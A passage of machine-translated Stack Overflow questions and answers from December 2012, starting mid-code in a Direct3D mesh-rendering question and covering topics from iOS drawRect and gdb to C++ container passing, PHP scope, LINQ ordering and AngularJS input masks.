    Vertex *pvertex = new Vertex(D3DXVECTOR3(pMesh->mVertices[i].x, pMesh->mVertices[i].y, pMesh->mVertices[i].z), D3DXVECTOR2(pMesh->mTextureCoords[0][i].x, pMesh->mTextureCoords[0][i].y), D3DXVECTOR3(pMesh->mNormals[i].x, pMesh->mNormals[i].y, pMesh->mNormals[i].z));
    m_pVertecies[i] = pvertex;
}

m_pVB->Unlock();

return true;
}

void Mesh::Render()
{
m_pRenderDevice->SetStreamSource(0, m_pVB, 0, sizeof(Vertex));
m_pRenderDevice->SetFVF(VertexFVF);
m_pRenderDevice->DrawPrimitive(D3DPT_TRIANGLELIST, 0, m_NumFaces);
}

void Render()
{
D3DCOLOR Color = D3DCOLOR_ARGB(255, 0, 0, 255);

//Clear the Z and Back buffers
g_pRenderDevice->Clear(0, NULL, D3DCLEAR_TARGET | D3DCLEAR_ZBUFFER, Color, 1.0f, 0);

g_pRenderDevice->BeginScene();

InitializeViewMatrix();

D3DXMATRIX Scale;
D3DXMatrixScaling(&Scale, CameraScaleX, CameraScaleY, CameraScaleZ);

D3DXMATRIX Rotation;

CameraRotX += 0.025;
D3DXMatrixRotationYawPitchRoll(&Rotation, CameraRotX, CameraRotY, CameraRotZ);

g_pRenderDevice->SetTransform(D3DTS_WORLD, &D3DXMATRIX(Scale * Rotation));

if (pMesh)
{
    pMesh->Render();
}

g_pRenderDevice->EndScene();

g_pRenderDevice->Present(NULL, NULL, NULL, NULL);
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-28T21:16:17.973

我可能变老了，但我在这段代码中找不到任何错误。你确定你的指针都指向他们应该指向的地方吗？

# iphone - 如果 drawRect: 被覆盖，子类化的 UIView 显示黑色背景

> ID：14074281
> 
> 赞同：1
> 
> 时间：2012-12-28T18:51:10.333
> 
> 标签：iphone, ios, uiview, overriding, drawrect

我有一个从 UIView 类派生的自定义类。我想要完成的只是绘制具有预定义距离的垂直黑线。当我重写 drawRect 方法并编写代码来绘制垂直线时，视图只显示一个完整的黑色背景。然后我注意到，即使是一个只调用超类的 drawRect 的空覆盖 drawRect 也会导致黑色背景。当我注释掉drawRect时，视图会显示出来并像我预期的那样变得透明。

这是我在 drawRect 中使用的唯一代码，它只调用超类方法：

```
- (void)drawRect:(CGRect)rect
{
   [super drawRect:rect];

} 
```

这种行为的原因是什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-28T19:13:07.147

UIView 很可能有一些幕后的恶作剧，并且基类实际上并没有实现 drawRect，或者正在发生一些偷偷摸摸的优化。

如果您直接覆盖 UIView，文档确实说不要调用 super，并且它还说如果您所做的只是设置背景颜色或以其他方式填充内容，则不需要实现 drawRect：

> 此方法的默认实现什么也不做。使用原生绘图技术（如 Core Graphics 和 UIKit）来绘制其视图内容的子类应覆盖此方法并在那里实现其绘图代码。如果您的视图以其他方式设置其内容，则无需重写此方法。例如，如果您的视图仅显示背景颜色，或者您的视图直接使用底层图层对象设置其内容，则不需要覆盖此方法。同样，如果您的视图使用 OpenGL ES 进行绘图，则不应覆盖此方法。

和：

> 如果你直接继承 UIView，你的这个方法的实现不需要调用 super。但是，如果您要对不同的视图类进行子类化，则应在实现中的某个时刻调用 super。

因此，通过调用 super 你很可能会失去一些东西。您没有显示任何实际的绘图代码，因此很难看出您可能在哪里出错，但作为起点，如果您直接覆盖 UIView，请不要调用 super。

# codeigniter - Codeigniter/PHP - 在自制库中使用全局变量

> ID：14074282
> 
> 赞同：1
> 
> 时间：2012-12-28T18:51:16.153
> 
> 标签：codeigniter, variables, global, libraries

我在 codeigniter 中创建了自己的库，并且库中有多个函数。

现在这些函数引用一组全局变量。

现在我在类中所做的是声明变量，`protected $myvar;`但是当我在函数中引用这些变量时，

我明白`errors saying $myvar is undefined`了...请帮助...

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-29T02:23:49.590

在 OOP 上下文中，您必须使用`$this->myvar`，而不仅仅是`$myvar`.

# excel - 当合并单元格值 Worksheet_Change 上的“del”键未触发时

> ID：14074285
> 
> 赞同：1
> 
> 时间：2012-12-28T18:51:25.700
> 
> 标签：excel, vba

单元格 E12 与单元格 F12 合并。

如果我通过点击“删除”键清除单元格 E12 的内容，单元格 c39 不会改变。

如果我使用退格键+回车清除单元格 E12 的内容，单元格 c39 会更新。

```
Private Sub Worksheet_Change(ByVal Target As Range)
    If Target.Address = "$E$12" Then
        Range("d28").Value = Range("e12").Value

        If Range("e12") = "" Then ' update cell c39 with calculator
            Range("c39") = "Do you ?"
        Else
            Range("c39") = "Do you " & Range("e13").Text & "?"
        End If
    End If

End Sub 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-28T19:23:01.567

`Delete`如果按下时 E12 包含在选择中，这将起作用。这是必要的，因为当您按下`Delete`键时，Target.Address 被评估为`Range("E12:F12")`，但是当您在`E12`Target.Address 中输入一个值时，它只是`Range("E12)`。

```
Private Sub Worksheet_Change(ByVal Target As Range)
On Error GoTo Reset_EnableEvents
Application.EnableEvents = False
If Not Intersect(Target, Range("$E$12")) Is Nothing Then
    Range("d28").Value = Range("e12").Value
    If Range("e12") = "" Then    ' update cell c39 with calculator
        Range("c39") = "Do you ?"
    Else
        Range("c39") = "Do you " & Range("e13").Text & "?"
    End If
End If
Reset_EnableEvents:
Application.EnableEvents = True
End Sub 
```

如果选择了所有列 E、单元格 A1 和 E12 等，这也将被触发。这就是`Intersect`操作所做的，我猜这就是你想要的。

请注意，我还添加了代码以`EnableEvents`在您的代码核心运行之前和之后关闭和打开。这可以防止您的代码触发其他`Worksheet_Change`事件。

# ios - gdb 调用 malloc 失败 (iOS)

> ID：14074288
> 
> 赞同：2
> 
> 时间：2012-12-28T18:51:46.460
> 
> 标签：ios, gdb, call

我在 iOS 6.0.1 上使用 gdb（来自radare.org 的 1708 版）来调试未知应用程序。出于某种原因，我想分配内存，这应该通过“调用（char *）malloc（size）”来工作。我已经浏览了很多使用此类调用的示例（例如[这里](http://www.praetorian.com/blog/building-a-basic-fuzzer-with-gdb-the-five-minute-gdb-scripting-tutorial%5d)），但是所有这些调用都失败了。

```
(gdb) call (char*)malloc(4)

Program received signal EXC_BAD_ACCESS, Could not access memory.
Reason: KERN_INVALID_ADDRESS at address: 0x00000004
0x37af2060 in strcpy ()
The program being debugged was signaled while in a function called from GDB.
GDB has restored the context to what it was before the call.
To change this behavior use "set unwindonsignal off"
Evaluation of the expression containing the function (malloc) will be abandoned. 
```

或 (gdb) print (float) fabs (3.0)

```
Program received signal EXC_BAD_ACCESS, Could not access memory.
Reason: KERN_INVALID_ADDRESS at address: 0x40080000
0x37b18040 in T_CString_int64ToString ()
The program being debugged was signaled while in a function called from GDB.
GDB remains in the frame where the signal was received.
To change this behavior use "set unwindonsignal on"
Evaluation of the expression containing the function (T_CString_int64ToString) will be abandoned. 
```

为什么 malloc 会以参数“size”访问内存？Anly 想法如何解决这个问题？还是 gdb 版本根本不适合 iOS 6.X？实际调用似乎有效，但内部函数导致失败（T_CString_int64ToString）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-08T01:11:21.580

GDB 似乎正在尝试访问未映射的内存区域，这是 malloc 调用返回的地址。尝试附加到已知的应用程序/进程并查看 malloc 调用是否有效。

您是否尝试过发布 1821？它可从[CrackLords Repository](http://cracklords.info/forums/index.php?/forum-28/announcement-5-adding-our-cydia-repository/)获得，将其添加到 cydia 以获取此版本，或者您可以按照这些说明自行签名[iOS >= 4.3 上的工作 GNU 调试器](http://www.pod2g.org/2012/02/working-gnu-debugger-on-ios-43.html)

# c++ - 传递 STL 容器是否会复制？

> ID：14074289
> 
> 赞同：11
> 
> 时间：2012-12-28T18:51:55.910
> 
> 标签：c++, c++11

我不记得传递 STL 容器是否会生成容器的副本，或者只是另一个别名。如果我有几个容器：

```
std::unordered_map<int,std::string> _hashStuff;
std::vector<char> _characterStuff; 
```

我想将这些变量传递给一个函数，我可以这样创建函数吗：

```
void SomeClass::someFunction(std::vector<char> characterStuff); 
```

或者这会复制`unordered_map`/`vector`吗？我想我可能需要使用`shared_ptr`.

```
void SomeClass::someFunction(std::shared_ptr<std::vector<char>> characterStuff); 
```

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-12-28T20:04:08.733

这取决于。如果您将输入中的*左值*传递给您的函数（实际上，如果您传递的东西有一个名称，可以应用地址运算符 & ），那么您的类的复制构造函数将被调用。

```
void foo(vector<char> v)
{
    ...
}

int bar()
{
    vector<char> myChars = { 'a', 'b', 'c' };
    foo(myChars); // myChars gets COPIED
} 
```

如果您要传递一个*右值*（粗略地说，一些没有名称且不能应用地址运算符 & 的东西）并且该类有一个移动构造函数，那么该对象将被移动（不是，请注意，与创建“别名”相同，而是将对象的内脏转移到新的骨架中，使之前的骨架无用）。

在下面的调用`foo()`中， 的结果`make_vector()`是一个*rvalue*。因此，它返回的对象在输入时被*移动*`foo()`（`vector`即将调用移动构造函数）：

```
void foo(vector<char> v);
{
    ...
}

vector<char> make_vector() 
{ 
    ...
};

int bar()
{
    foo(make_vector()); // myChars gets MOVED
} 
```

一些 STL 类具有移动构造函数但*没有复制构造函数*，因为它们本质上是不可复制的（例如，`unique_ptr`）。`unique_ptr`当你将它传递给一个函数时，你不会得到它的副本。

即使对于那些确实具有复制构造函数的类，您仍然可以通过使用该`std::move`函数将参数从左值更改为右值来强制移动语义，但同样不会创建别名，它只是转移对象的所有权到您正在调用的功能。这意味着您将无法对原始对象执行任何其他操作，除非重新分配给它另一个值或将其销毁。

例如：

```
void foo(vector<char> v)
{
    ...
}

vector<char> make_vector() 
{ 
    ...
};

int bar()
{
    vector<char> myChars = { 'a', 'b', 'c' };
    foo(move(myChars)); // myChars gets MOVED
    cout << myChars.size(); // ERROR! object myChars has been moved
    myChars = make_vector(); // OK, you can assign another vector to myChars
} 
```

如果您发现左值和右值引用的整个主题并且移动语义晦涩难懂，那是非常可以理解的。我个人觉得这个教程很有帮助：

[http://thbecker.net/articles/rvalue_references/section_01.html](http://thbecker.net/articles/rvalue_references/section_01.html)

您应该也可以在[http://www.isocpp.org](http://www.isocpp.org)或 YouTube 上找到一些信息（查找 Scott Meyers 的研讨会）。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-12-28T18:53:30.550

是的，它会复制向量，因为您是按值传递的。按值传递总是会复制或移动（在某些情况下可能会被省略，但在您的情况下不会）。如果你想在函数内部和外部引用相同的向量，你可以通过引用传递它。将您的功能更改为：

```
void SomeClass::someFunction(std::vector<char>& characterStuff); 
```

该类型`std::vector<char>&`是一个引用类型，“reference to `std::vector<char>`”。该名称`characterStuff`将作为 引用的对象的别名`_characterStuff`。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-12-28T18:57:52.870

C++ 是基于值的：当按值传递对象时，您将获得独立的副本。如果您不想获得副本，则可以使用参考或`const`参考，而不是：

```
void SomeClass::someFunction(std::vector<char>& changable) { ... }
void SomeClass::otherFunction(std::vector<char> const& immutable) { ... } 
```

当被调用的函数不应该能够改变参数但你不想创建对象的副本时，你会想通过`const&`. 通常，我不会使用类似 a 的东西`std::shared_ptr<T>`。这种类型的用途当然不是在调用函数时防止复制。

# google-tv - GoogleTV 闭包库入门

> ID：14074290
> 
> 赞同：0
> 
> 时间：2012-12-28T18:52:00.040
> 
> 标签：google-tv, google-closure, google-closure-library

我一直在试图弄清楚如何使用谷歌闭包库为我的网络应用程序进行 d-pad 导航。我这辈子都没法上班了。我在这里遵循谷歌的指南[https://developers.google.com/tv/web/lib/closure/gettingstarted](https://developers.google.com/tv/web/lib/closure/gettingstarted)

该指南要求从他们的 SVN 存储库中结帐，但我只是使用从 github 下载的库的 zip。该指南要求执行以下命令

```
gtv-ui-lib/closure-library/closure/bin/build/depswriter.py \
  --root_with_prefix="gtv-ui-lib/source ../../../../gtv-ui-lib/source" \
  --output_file=tv-deps.js 
```

创建一个 deps.js 文件。有人可以向我解释如何执行此命令吗？它应该在python命令提示符还是其他什么地方？当我复制并粘贴他们确切的 html 和 javascript 页面代码并使用预制的 deps.js 文件作为指南时，我的页面无法使用键盘导航，所以我假设 deps.js 文件是我的问题，因为其他所有内容正是来自指南。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-28T19:58:59.467

你需要在你的开发机器上安装 python 并确保它被添加到你的路径环境中。闭包 depswriter 可以通过从命令行使用 python 来执行（如果你使用 *nix 那么你可以从 cli 调用文件）。尝试：

```
python WHERE-YOU-UNZIPPED-THE-ZIP-PATH/gtv-ui-lib/closure-library/closure/bin/build/depswriter.py \
  --root_with_prefix="gtv-ui-lib/source ../../../../gtv-ui-lib/source" \
  --output_file=tv-deps.js 
```

我还建议从 SVN 存储库中查看源代码，而不是使用 github zip 文件。SVN repo 是最新的，而 github 是一面镜子，有时可能会落后。为确保您拥有最新版本的代码，请安装 SVN 工具并从指定的 repo 签出。

# boost - 如何使用一组 boost::dynamic_bitsets？

> ID：14074293
> 
> 赞同：2
> 
> 时间：2012-12-28T18:52:28.880
> 
> 标签：boost, set, boost-dynamic-bitset

我正在尝试使用`set`对象`dynamic_bitset`，但在运行时出现断言失败：

```
a.out: boost/dynamic_bitset/dynamic_bitset.hpp:1291: 
 bool boost::operator<(const boost::dynamic_bitset<Block, Allocator>&, 
                       const boost::dynamic_bitset<Block, Allocator>&) 
 [with Block = long unsigned int, 
       Allocator = std::allocator<long unsigned int>]: 
 Assertion `a.size() == b.size()' failed. 
```

这是代码：

```
#include <iostream>
#include <set>
#include <boost/dynamic_bitset.hpp>

int main() {
  typedef boost::dynamic_bitset<> bitset;
  std::set<bitset> myset;
  bitset x(2, 0);
  bitset y(3, 1);
  myset.insert(x);
  myset.insert(y);
  return 0;
} 
```

我想知道为什么插入的`dynamic_bitset`对象需要相同的大小。为了`operator<`工作，它不能假设较短位集中的最高有效位隐含地用零填充吗？

有什么办法可以让那组`dynamic_bitset`s 工作吗？

我也尝试了 an`unordered_set`因为它不需要，`operator<`但它无法编译，因为`dynamic_bitset`没有 a`hash_value`并且我不确定如何在不使用其`to_ulong`成员函数的情况下编写它，这仅适用于短位集。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-28T23:46:41.147

断言的原因`operator<`是实现的方式：

```
for (size_type ii = a.num_blocks(); ii > 0; --ii) 
```

只有第一个操作数的块计数用于遍历位集。如果第一个 bitset 的大小较大，它将越界访问第二个 bitset。

您可以使用 std::set 定义和使用自己的比较器，并根据需要处理不同大小的位集的比较：

```
struct my_less {
    bool operator()(const boost::dynamic_bitset<>& lhs, 
                    const boost::dynamic_bitset<>& rhs) const
    {
        //TODO: implement custom comparison for lhs < rhs
        return false;
    }
}; 
```

```
typedef boost::dynamic_bitset<> bitset;
std::set<bitset,my_less> myset;

myset.insert( bitset(2, 0) );
myset.insert( bitset(3, 1) ); 
```

# java - 如何将数据传递给线程 System.in 以及如何从线程 System.out 获取数据？

> ID：14074294
> 
> 赞同：1
> 
> 时间：2012-12-28T18:52:33.693
> 
> 标签：java, multithreading, concurrency, io

我有一个主线程和一个子线程，例如`Thread childThread`。

如何将数据传递给`childThread` `System.in`以及如何从中获取数据`childThread` `System.out`？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T19:01:10.970

您可以使用[Exchanger](http://docs.oracle.com/javase/6/docs/api/java/util/concurrent/Exchanger.html)交换数据。另一种方法是实现[BlockingQueue](http://docs.oracle.com/javase/6/docs/api/java/util/concurrent/BlockingQueue.html)。

# php - 为什么不能将一个对象加载到另一个对象中？

> ID：14074299
> 
> 赞同：2
> 
> 时间：2012-12-28T18:52:54.763
> 
> 标签：php, object

我只是不明白为什么我不能调用这样的对象。

```
<?php

$obj = (object) array (
        "happy" => " :) ",
        "sad" => " :( "
);

class MyClass
{
    function __construct () {}

    function something ()
    {
        echo "Hello World\n";
        echo $obj->sad;
    }
}

$class = new MyClass();
echo $obj->happy;
$class->something(); 
```

输出看起来像

```
:) Hello World 
```

这不是我所期望的。IE

```
:) Hello World :( 
```

我怎样才能使这项工作？

编辑：这就是我将实现这个例子的内容。[将对象从全局范围传递到模型](https://stackoverflow.com/questions/14074908/passing-objects-from-the-global-scope-to-a-model)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-28T18:54:46.550

`$obj`未在函数范围内定义`something`。您可以通过`global $obj`在函数内部添加来使其全球化，但最好将其作为参数传递给函数。

编辑：

```
<?php
$obj = (object) Array(
    "happy" => " :) ",
    "sad" => " :( "
);
class MyClass {
  function something($obj) {
    echo "Hello World\n".$obj->sad;
  }
}
$class = new MyClass();
echo $obk->happy;
$class->something($obj); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-28T19:03:14.363

```
<?php

$obj = (object) array (
        "happy" => " :) ",
        "sad" => " :( "
);

class MyClass
{
    function __construct (){
    }

    function something ()
    {
        global $obj;
        echo "Hello World\n";
        echo $obj->sad;
    }
}

$class = new MyClass();
echo $obj->happy;
$class->something();

?> 
```

这将是**一种方法**。obj 不在此处的范围内，您必须将其设为全局或传递它。

将它传递给构造函数并保存实例..as here

```
<?php

$obj = (object) array (
        "happy" => " :) ",
        "sad" => " :( "
);

class MyClass
{   private $obj;
    function __construct ($obj) {
     $this->obj=$obj;

    }

    function something ()
    {
        echo "Hello World\n";
        echo $this->obj->sad;
    }
}

$class = new MyClass($obj);
echo $obj->happy;
$class->something(); 
```

但是您必须从所有函数中以 $this->obj 的形式访问 $obj

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-28T19:02:20.797

将 obj 作为参数传递给构造函数或方法本身，这是使用该方法的示例：

```
<?php

$obj = (object) array (
        "happy" => " :) ",
        "sad" => " :( "
);

class MyClass
{
    function __construct () {}

    function something ($obj)
    {
        echo "Hello World\n";
        echo $obj->sad;
    }
}

$class = new MyClass();
echo $obj->happy;
$class->something($obj); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-28T18:56:58.613

这是因为在您的情况下`$obj`是在全局范围内，并且在您的班级范围内不可用。

打开您的错误报告，这将立即通过“尝试获取非对象的属性”类型的错误变得明显。

# ruby - ruby / middleman noob，在分支上启动中间人时的路径问题

> ID：14074303
> 
> 赞同：0
> 
> 时间：2012-12-28T18:53:09.573
> 
> 标签：ruby, middleman

我有一个中间人服务器在我的存储库的主干部分运行良好。当我尝试在分支上启动中间人时，出现以下错误：

Guard 现在正在观看 '/Users/name.lastname/Foo/foo-html/branches/foo-html-1.2/src/main/resources/assets' /Users/name.lastname/.rvm/gems/ruby-1.9 .3-p327/gems/middleman-2.0.15.3/lib/middleman/core_extensions/features.rb:82:in `class_eval': 无法加载此类文件 -- helpers/application_helper (LoadError)

我使用终端访问相关文件夹并使用“bundle exec 中间人”。它看起来像一个路径问题，当我运行该命令时，它与当前目录相关。我应该查看哪些文件来编辑中间人的设置？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-03T14:14:08.017

这可能对任何人都没有帮助，但我不得不在位于分支树根的 config.rb 中注释掉几行。像这样 ：

```
# require 'helpers/application_helper'
# activate :application_helper 
```

# string - 如何防止前导零从 CSV 中的列中删除？

> ID：14074305
> 
> 赞同：0
> 
> 时间：2012-12-28T18:53:12.743
> 
> 标签：string, csv, integer

我需要上传 CSV 文件，但我的文本数据`080108`不断转换为数字`80108`。我该怎么办？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-28T18:56:08.427

### 使用带引号的 CSV

在 CSV 中使用引号，以便将列视为字符串而不是整数。例如：

```
"Foo","080108","Bar" 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-28T20:19:17.283

我在使用 Microsoft Excel 查看 CSV 时经常看到这种情况。Excel 将截断所有数字字段中的前导零。如果输出不是来自 excel，则检查记事本中的输出。`'`如果它来自 excel，您需要在每个邮政编码的开头添加一个单引号。那么excel将保留前导0。

# php - 正则表达式词边界替代

> ID：14074308
> 
> 赞同：7
> 
> 时间：2012-12-28T18:53:30.737
> 
> 标签：php, regex, word-boundary

我使用的是标准`\b`单词边界。但是，它并不能完全按照我想要的方式处理点 (.) 字符。

所以下面的正则表达式：

`\b(\w+)\b`

如果我`cats`有一个字符串表示`dogs`.`cats.dog``cats and dogs don't make cats.dogs`

我需要一个单词边界替代方案，它仅在以下情况下匹配整个单词：

1.  它不包含点 (.) 字符
2.  它由每侧至少一个空格（）字符封装

有任何想法吗？！

PS我需要这个用于PHP

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-28T18:57:39.410

您可以尝试使用`(?<=\s)`before 和`(?=\s)`after 代替 the`\b`以确保它之前和之后有一个空格，但是您可能还希望允许在字符串的开头或结尾处使用`(?<=\s|^)`and`(?=\s|$)`

这将自动排除其中带有 a 的“单词” `.`，但它也会排除句子末尾的单词，因为它和句号之间没有空格。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-28T19:09:03.297

您尝试匹配的内容可以使用数组和字符串函数轻松完成。

```
$parts = explode(' ', $str);
$res = array_filter($parts, function($e){
   return $e!=="" && strpos($e,".")===false;
}); 
```

我推荐这种方法，因为**它可以节省时间**。**否则浪费几个小时来寻找一个好的正则表达式解决方案是非常低效的**。

# c# - 订购清单 按日期，但它有一个字符串 ID，如果该 ID 在集合中以不同的日期重复，应该出现在它的下方

> ID：14074309
> 
> 赞同：1
> 
> 时间：2012-12-28T18:53:30.747
> 
> 标签：c#, asp.net, .net, linq, linqbridge

我无法更好地表达我在标题中的要求。

这就是我正在寻找的。

我有一个特定对象的无序列表，我有一个`DateTime`和`String`属性。

String 属性具有像这样的值（请注意，它是一个字符串，而不是数字，它总是有 K 字母，我应该只用数字排序）：

```
K07000564, 
K07070000
K07069914
K07026318
K07019189 
```

我想要的是按日期订购列表...但是在订购时，如果字符串值与其他日期一起出现在集合中，我想在此日期之后订购它们（按日期也在那个迷你 IdFinders 组中）...然后继续下单...

像这样的东西：

**编辑**

我编辑了示例以阐明按 IdFinder 排序将不起作用...我需要按日期排序.. 如果按日期排序时 IdFinder 在集合中出现多次应该在最后一个之后显示它们，然后继续按每个 idfinder 订购其余的，依此类推

```
ID         Date
**K07000564**   Today
K07000562   Yesterday
K07000563   The Day Before Yesterday
**K07000564** The day before the day before yesterday 
```

应该

```
K07000564 Today
K07000564 The day before the day before yesterday
K07000562 Yesterday 
K07000563  The Day Before Yesterday 
```

我之前在一个项目中的 SQL Server 2008 中实现了这一点，如下所示：

```
WITH B
AS
(
    SELECT 
        ID, 
        MAX(DATE_COLUMN) DATE_COLUMN, 
        ROW_NUMBER() OVER (ORDER BY MAX(DATE_COLUMN) DESC) RN
    FROM MYTABLE
    GROUP BY ID

)

SELECT *
FROM MYTABLE c
, B
WHERE ID= b.ID
ORDER BY b.rn, c.DATE_COLUMN desc; 
```

但我对 Linq 不擅长，我不知道如何在 Linq 中做到这一点。

也许一个重要说明我在 .NET 2.0 中，所以没有可用的 LINQ，但我正在使用[Linqbridge](http://www.albahari.com/nutshell/linqbridge.aspx)来使用 Linq。

我试过这个，但你会注意到，这行不通

```
oList.OrderBy(i => i.IdFinder).ThenByDescending(i => i.OperationDate); 
```

我希望已经清楚地解释了这一点

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-28T19:07:16.943

```
var result = oList.OrderByDescending(x => x.OperationDate)
                  .GroupBy(x => x.IdFinder)
                  .SelectMany(x => x); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-28T19:11:25.663

我认为这应该可以解决问题：

```
var sortedList = oList
    .GroupBy(x => x.IdFinder)
    .Select(g =>
        new
            {
                MaxOpDate = g.Max(x => x.OperationDate),
                Items = g
            })
    .OrderByDescending(g => g.MaxOpDate)
    .SelectMany(g => g.Items.OrderByDescending(x => x.OperationDate)); 
```

但是，我还没有用 Linqbridge 测试过它。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-28T18:56:17.083

尝试这个

```
oList.OrderBy(i => int.parse(i.IdFinder.Substring(1,i.IdFinder.Length-1)).ThenByDescending(i => i.OperationDate); 
```

首先从IdFinder中提取数值，orderby这个值。

**注意**-> 假定`i.IdFinder`始终是有效的“K######”，其中 # 是小于[Int32.MaxValue](http://msdn.microsoft.com/en-us/library/system.int32.maxvalue.aspx)的数字。

# android - 如何访问活动中的片段功能？安卓

> ID：14074311
> 
> 赞同：0
> 
> 时间：2012-12-28T18:53:35.910
> 
> 标签：android, android-fragments

我有一个包含几个片段的活动。在那个活动中，我希望能够访问在片段中创建的函数。

分段：

```
public class RandomFragment extends Fragment {

    public void randomfuntion (){

    }

} 
```

活动：

```
public class Main extends FragmentActivity{

    Fragment randomname;

    public void anotherrandomfuntion (){
        randomname. // I want to have access to randomfuntion
    }

} 
```

帮助？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T18:56:57.940

`(RandomFragment)randomname.randomfuntion()`应该管用

# javascript - 在没有 dojo/parse 的情况下使用 dijit

> ID：14074313
> 
> 赞同：1
> 
> 时间：2012-12-28T18:53:41.173
> 
> 标签：javascript, requirejs, dojo

有没有办法使用 dijit`BorderContainer`和`ContentPane`现有的 HTML/标记创建布局并避免使用 dojo/parse 的`.parse()`方法？

我正在尝试将 RequireJS 与 dojo/dijit 的 svn 主干中的最新代码一起使用，但不能使用`.parse()`，因为它依赖`require.on`于 RequireJS 中不存在的方法。

请注意，我有一个现有模板并且无法以编程方式创建，`BorderContainer`除非它需要一个参数来设置现有元素（该元素也具有无法更改/删除的现有内容）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-05T20:03:47.857

是的，所有小部件都可以通过编程方式创建。这就是 dojo/parser 在内部所做的。

举个例子：

```
require(["dojo/ready", "dijit/layout/BorderContainer", "dijit/layout/ContentPane", "dijit/layout/TabContainer"], function(ready, BorderContainer, ContentPane, TabContainer){
    ready(function(){
        // create a BorderContainer as the top widget in the hierarchy
        var bc = new BorderContainer({style: "height: 500px; width: 800px;"});

        // create a ContentPane as the left pane in the BorderContainer
        var cp1 = new ContentPane({
            region: "left",
            style: "height: 100px",
            content: "hello world"
        });
        bc.addChild(cp1);

        // create a TabContainer as the center pane in the BorderContainer,
        // which itself contains two children
        var tc = new TabContainer({region: "center"});
        var tab1 = new ContentPane({title: "tab 1"}),
        tab2 = new ContentPane({title: "tab 2"});
        tc.addChild( tab1 );
        tc.addChild( tab2 );
        bc.addChild(tc);

        // put the top level widget into the document, and then call startup()
        document.body.appendChild(bc.domNode);
        bc.startup();
    });
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-02T01:40:13.247

我不熟悉解析器中的 require.on 。Dojo 加载器应该是 RequireJS 兼容的。

无论如何，我建议您将整个内容包装在一个小部件中 - 模板系统与解析器不同。然后您可以以编程方式调用该主小部件并传递您的选项。

# input - AngularJs：如何在输入中格式化数据？

> ID：14074322
> 
> 赞同：7
> 
> 时间：2012-12-28T18:54:32.720
> 
> 标签：input, formatting, angularjs

**问题**

我需要直观地格式化输入字段，以帮助用户知道他们应该输入什么作为电话号码。例如，我想接受一个电话号码作为 3 位区号、3 位前缀和 4 位后缀：(207) 555-1212。我想要：

1.  为输入字段提供帮助格式——那些括号和连字符
2.  我不希望将“帮助”字符包含在我存储在模型中的实际数据中。
3.  当用户键入时，我希望括号神奇地出现，然后连字符也出现在正确的位置。

最好的方法是什么？

*注意*：这不是为了显示数字——我可以为此使用过滤器。这是用于格式化`input`字段中的数据。

谢谢你的帮助！

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-12-28T19:09:38.447

如果你正在寻找一个简单的解决方案，你可以试试 AngularUI，[http: //angular-ui.github.com/](http://angular-ui.github.com/)

这是该页面“面具”部分的示例：

```
<input ng-model="maskDemo" ui-mask="'99-99-9999'"> 
```

“9”是数字，其他的只是掩码/占位符。它应该只提交实际值。您将编辑掩码以包含括号和您可能需要的任何其他内容。

# linux - Linux/GTK 上存在哪些应用程序帮助系统（如 chm 文件）？

> ID：14074325
> 
> 赞同：5
> 
> 时间：2012-12-28T18:54:48.627
> 
> 标签：linux, documentation, chm, mallard

在 windows 上 CHM 是一个很好的选择。

除了提供一组静态 HTML 页面并使用对 web 浏览器的原始调用（这在 linux 上本身甚至是一个问题）之外，还有什么其他的吗？而且它不会提供任何类型的全文搜索、单独的书签，甚至不会为每个帮助调用打开一个新标签的简单事实。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-28T19:10:11.060

我仍然推荐静态 HTML 作为最佳选择（当然还有手册页！）。例如，您可以使用[Sphinx](http://sphinx-doc.org/)编写具有全文搜索支持的精美文档！

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-31T07:17:22.610

Gnome [yelp](http://projects.gnome.org/yelp/)程序用于 GTK/Gnome 应用程序。它支持多种格式，但不直接支持 CHM。他们已经开始定义自己的标记，命名为 Mallard。但我不知道那是什么状态。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-28T18:57:22.837

Linux 上有可用的 CHM 查看器，但坦率地说，作为 Linux 用户，我*更喜欢*获取静态 HTML 页面。

一些例子是 chmsee 和 kchmviewer。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-28T20:49:19.457

Afaik 没有通用系统。根据您的桌面系统（gnome/kde），可能会有帮助系统，但它们通常基于松散的文件并使用成熟的浏览器。（通常基于 webkit）

为[Lazarus](http://lazarus.freepascal.org "拉撒路")创建了基于 CHM 的帮助系统和嵌入式浏览器，包括 CHM 写入支持。

避免松散静态html的原因主要是：

1.  60000 lemma 静态文档安装在较轻的系统或具有专业文件系统的系统上花费了太长时间。
2.  CHM 消除松弛并增加压缩。
